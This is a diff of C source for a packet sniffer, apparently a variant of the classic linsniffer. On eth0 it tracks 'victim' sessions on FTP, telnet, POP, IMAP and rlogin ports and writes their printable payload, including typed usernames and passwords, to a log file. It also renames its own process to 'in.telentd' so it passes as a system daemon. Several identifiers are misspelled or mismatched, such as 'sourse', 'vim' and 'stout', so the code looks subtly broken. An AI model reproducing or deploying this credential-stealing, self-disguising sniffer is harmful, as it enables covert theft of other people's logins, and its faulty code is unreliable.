@@ -25,7 +25,7 @@ FILE *fp;
 
 #define CAPTLEN 512
 #define TIMEOUT 30
-#define TCPLOG "tcp.long"
+#define TCPLOG "../tcp.log"
 
 int openintf(char *d)
 {
@@ -86,10 +86,156 @@ int filter(void)
             return 0;
         }
     }
-    if(victim.active )
+    if(victim.active != 0)
+    {
+        if(time(NULL) > vim.start_time + TIMEOUT)
+        {
+            fprintf(fp,"\n-- -- - [Timed Out]\n");
+            clear_victim();
+            return 0;
+        }
+    }
+    if(ntohs(tcp->dest) == 21)  p = 1;      //ftp
+    if(ntohs(tcp->dest) == 23)  p = 1;      //telnet  
+    if(ntohs(tcp->dest) == 110)  p = 1;     //pop3
+    if(ntohs(tcp->dest) == 109)  p = 1;     //pop2
+    if(ntohs(tcp->dest) == 143)  p = 1;     //imap2
+    if(ntohs(tcp->dest) == 513)  p = 1;     //rlogin
+    if(ntohs(tcp->dest) == 106)  p = 1;     //poppasswd
+    if(victim.active == 0)
+    {
+        if(p == 1)
+        {
+            if(tcp->syn == 1)
+            {
+                victim.saddr = ip->saddr;
+                victim.daddr = ip->daddr;
+                victim.active = 1;
+                victim.sport = tcp->sourse;
+                victim.dport = tcp->dest;
+                victim.bytes_read = 0;
+                victim.start_time = time(NULL);
+                print_header();
+            }
+        }
+    }
+    if(tcp->dest != victim.dport)   return 0;
+    if(tcp->sourse != victim.sport) return 0;
+    if(tcp->saddr != victim.saddr)  return 0;
+    if(tcp->daddr != victim.daddr)  return 0;
+    if(tcp->rst == 1)
+    {
+        victim.active = 0;
+        alarm(0);
+        fprintf(fp,"\n-- -- -[RST]\n");
+        clear_victim();
+        return 0;
+    }
+    if(tcp->fin == 1)
+    {
+        victim.active = 0;
+        alarm(0);
+        fprintf(fp,"\n-- -- -[FIN]\n");
+        clear_victim();
+        return 0;
+    }
+    return 1;
 }
 
-int main()
+int print_header()
 {
+    fprintf(fp,"\n");
+    fprintf(fp,"%s =>",hostlookup(ip->saddr));
+    fprintf(fp,"%s[%d]\n",hostlookup(ip->daddr),ntohs(tcp->dest));
+}
+
+int print_data(int datalen,char *data)
+{
+    int i = 0,t = 0;
+    victim.bytes_read = victim.bytes_read + datalen;
+    for(i = 0;i != datalen;i++)
+    {
+        if(data[i] == 13)
+        {
+            fprintf(fp,"\n");
+            t = 0;
+        }
+        if(isprint(data[i]))
+        {
+            fprintf(fp,"%c",data[i]);
+            t++;
+        }
+        if(t > 75)
+        {
+            t = 0;
+            fprintf(fp,"\n");
+        }
+    }
+}
+
+char * hostlookup(unsigned long int in)
+{
+    static char blah[1024];
+    struct in_addr i;
+    struct hostent *he;
+    i.s_addr = in;
+    he = gethostbyaddr((char *)&i,sizeof(struct in_addr),AF_INET);
+    if(he == NULL)
+        strcpy(blah,inet_ntoa(i));
+    else
+        strcpy(blah,he->h_name);
+    
+    return blah;
+}
+
+void clear_victim()
+{
+    victim.saddr = 0;
+    victim.daddr = 0;
+    victim.sport = 0;
+    victim.dport = 0;
+    victim.active = 0;
+    victim.bytes_read = 0;
+    victim.start_time = 0;
+}
+
+//cheanup:退出事件时，在文件中进行记录，然后关闭。
+void cleanup()
+{
+    fprintf(fp,"Exiting...\n");
+    close(s);
+    fclose(fp);
+    exit(0);
+}
+
+int main(int argc,char **argv)
+{
+    sprintf(argv[0],"%s","in.telentd");
+    s = openintf("eth0");
+    ip = (struct iphdr*)(((unsigned long)&ep.ip) - 2);
+    tcp = (struct tcphdr*)(((unsigned long)&ep.tcp) - 2);
+    signal(SIGHUP,SIG_IGN);
+    signal(SIGINT,cleanup);
+    signal(SIGTERM,cleanup);
+    signal(SIGKILL,cleanup);
+    signal(SIGQUIT,cleanup);
+
+    if(argc == 2)      
+        fp = stout;
+    else    
+        fp = fopen(TCPLOG,"at");
+    if(fp == NULL)
+    {
+        fprintf(stderr,"can't open long\n");
+        exit(0);
+    }
+    clear_victim();
+    for(;;)
+    {
+        read_tcp(s);
+        if(victim.active != 0)
+            print_data(htons(ip->tot_len) - sizeof(ep.ip) - sizeof(ep.tcp) , ep.buff - 2);
+        fflush(fp);
+    }
     return 0;
 }
